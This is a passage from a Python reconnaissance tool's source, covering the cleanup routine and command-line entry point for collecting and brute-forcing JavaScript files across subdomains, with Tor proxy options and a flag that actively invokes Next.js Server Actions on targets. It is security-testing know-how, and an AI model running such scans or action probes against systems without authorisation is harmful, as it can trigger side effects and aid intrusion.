        "actions":  sorted(actions.values(), key=lambda a: a["id"]),
    }
    (domain_dir / "server_actions.json").write_text(
        json.dumps(info, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    return info


# ─── Entry point ─────────────────────────────────────────────────────────────


def cleanup_empty_domains(output_dir: Path) -> list[str]:
    """Remove domain dirs where nothing was found (empty js_files.txt + no js/ dir)."""
    removed = []
    for domain_dir in sorted(output_dir.iterdir()):
        if not domain_dir.is_dir():
            continue

        js_files_txt = domain_dir / "js_files.txt"
        bruted_txt   = domain_dir / "bruteforced.txt"
        js_dir       = domain_dir / "js"
        sources_dir  = domain_dir / "sources"

        # Check if any real content exists
        has_js_urls = (
            js_files_txt.exists() and
            js_files_txt.read_text().strip() not in ("", "\n")
        )
        has_bruted = (
            bruted_txt.exists() and
            bruted_txt.read_text().strip() not in ("", "\n")
        )
        has_js_files  = js_dir.exists() and any(js_dir.rglob("*.js"))
        has_sources   = sources_dir.exists() and any(sources_dir.rglob("*"))

        has_report = (domain_dir / "domain_report.json").is_file()

        if not (has_js_urls or has_bruted or has_js_files or has_sources or has_report):
            shutil.rmtree(domain_dir)
            removed.append(domain_dir.name)

    return removed


async def main():
    parser = argparse.ArgumentParser(
        description="JS recon: headless collection + filename brute"
    )
    parser.add_argument("-f", "--file", default=None, help="File with subdomains (one per line)")
    parser.add_argument("-u", "--url", default=None, help="Single subdomain/domain to scan")
    parser.add_argument("target", nargs="?", help="Single subdomain/domain to scan (positional, same as -u/--url)")
    parser.add_argument("-w", "--wordlist", default=None, help="Custom JS wordlist (one name per line, no extension)")
    parser.add_argument("-t", "--timeout", type=int, default=20, help="Page load timeout in seconds (default: 20)")
    parser.add_argument("-c", "--concurrency", type=int, default=3, help="Max parallel subdomains (default: 3)")
    parser.add_argument("-o", "--output", default="output", help="Output directory (default: ./output)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print every JS URL found")
    parser.add_argument("-d", "--download", action="store_true", help="Download all collected JS files")
    parser.add_argument("-H", "--header", action="append", default=None, metavar="'Name: value'",
                        help="Custom HTTP header (repeatable, e.g. -H 'Cookie: x=y' -H 'Authorization: Bearer x')")
    parser.add_argument("--proxy", default=None,
                        help="Proxy URL for brute requests (e.g. socks5://127.0.0.1:9050)")
    parser.add_argument("--brute-concurrency", type=int, default=20,
                        help="Parallel brute requests per directory (default: 20, use 3-5 for Tor)")
    parser.add_argument("--brute-delay", type=float, default=0.0,
                        help="Delay in seconds between brute requests (default: 0, use 1-2 for Tor)")
    parser.add_argument("--crawl", choices=["none", "medium", "deep"], default="none",
                        help="Crawl mode: none=single page; medium=interact+scroll; deep=follow internal links")
    parser.add_argument("--crawl-depth", type=int, default=10,
                        help="Max pages to visit in deep crawl mode (default: 10)")
    parser.add_argument("--probe-actions", action="store_true",
                        help="Actively confirm Server Action IDs via POST + Next-Action header "
                             "(WARNING: may execute actions server-side)")
    args = parser.parse_args()

    # Load target(s)
    if not args.file and not args.url and args.target:
        args.url = args.target
    if args.file:
        subdomains_path = Path(args.file)
        if not subdomains_path.exists():
            print(f"[!] File not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        subdomains = [l.strip() for l in subdomains_path.read_text().splitlines() if l.strip()]
    elif args.url:
        subdomains = [args.url]
    else:
        print("[!] Specify either -f/--file (subdomains file) or -u/--url (single domain)", file=sys.stderr)
        sys.exit(1)

    # Load wordlist
    if args.wordlist:
        wl_path = Path(args.wordlist)
        wordlist = [l.strip() for l in wl_path.read_text().splitlines() if l.strip() and not l.startswith("#")]
    else:
        wordlist = DEFAULT_WORDLIST

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    pending_subdomains = []
    skipped_subdomains = []
    for subdomain in subdomains:
        if is_domain_processed(output_dir, subdomain):
            skipped_subdomains.append(subdomain)
        else:
            pending_subdomains.append(subdomain)

    _debug_event("A", "domain queue prepared", {"input_count": len(subdomains), "pending_count": len(pending_subdomains), "skipped_count": len(skipped_subdomains)})

    if skipped_subdomains:
        print(f"[*] Skipping {len(skipped_subdomains)} domain(s) with existing results")
        for subdomain in skipped_subdomains:
            print(f"  [-] {subdomain}")

    if not pending_subdomains:
        print("\n[✓] Nothing to scan.")
        return

    headers = parse_headers(args.header)

    if args.probe_actions:
        print("[!] --probe-actions enabled: Server Actions will be actively invoked (POST + Next-Action). "
              "This may trigger side effects on the target.", file=sys.stderr)

    sem = asyncio.Semaphore(args.concurrency)
    # ProcessPoolExecutor for Playwright — each browser in isolated process
    # Prevents event loop blocking when a browser hangs
    pw_executor = ProcessPoolExecutor(max_workers=args.concurrency)
    tasks = [
        process_subdomain_safe(
            sub, output_dir, wordlist, args.timeout, sem,
            args.verbose, args.download,
            custom_headers=headers,
            proxy=args.proxy,
            brute_concurrency=args.brute_concurrency,
            brute_delay=args.brute_delay,
            pw_executor=pw_executor,
            crawl_mode=args.crawl,
            crawl_depth=args.crawl_depth,
            probe_actions=args.probe_actions,
        )
        for sub in pending_subdomains
    ]

    print(f"[*] Starting recon on {len(pending_subdomains)} subdomain(s)\n")
    try:
        _debug_event("D", "gather started", {"task_count": len(tasks), "crawl_mode": args.crawl, "concurrency": args.concurrency})
        results = await asyncio.gather(*tasks, return_exceptions=True)
        failures = [result for result in results if isinstance(result, Exception)]
        if failures:
            _debug_event("B", "domain tasks failed", {"failure_count": len(failures), "task_count": len(tasks)})
            for failure in failures:
                print(f"[!] Domain task failed: {failure}", file=sys.stderr)
    finally:
        _debug_event("D", "executor shutdown requested", {"wait": False, "cancel_futures": True})
        workers = list(getattr(pw_executor, "_processes", {}).values())
        pw_executor.shutdown(wait=False, cancel_futures=True)
        for worker in workers:
            if worker.is_alive():
                worker.terminate()
        for worker in workers:
            worker.join(timeout=5)

    # Cleanup empty domain directories
    cleaned = cleanup_empty_domains(output_dir)
    if cleaned:
        print(f"[*] Cleaned up {len(cleaned)} empty domain dir(s):")
        for d in cleaned:
            print(f"  [-] {d}")

    print("\n[✓] Done.")
    _debug_event("D", "main completed", {"pending_count": len(pending_subdomains)})


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
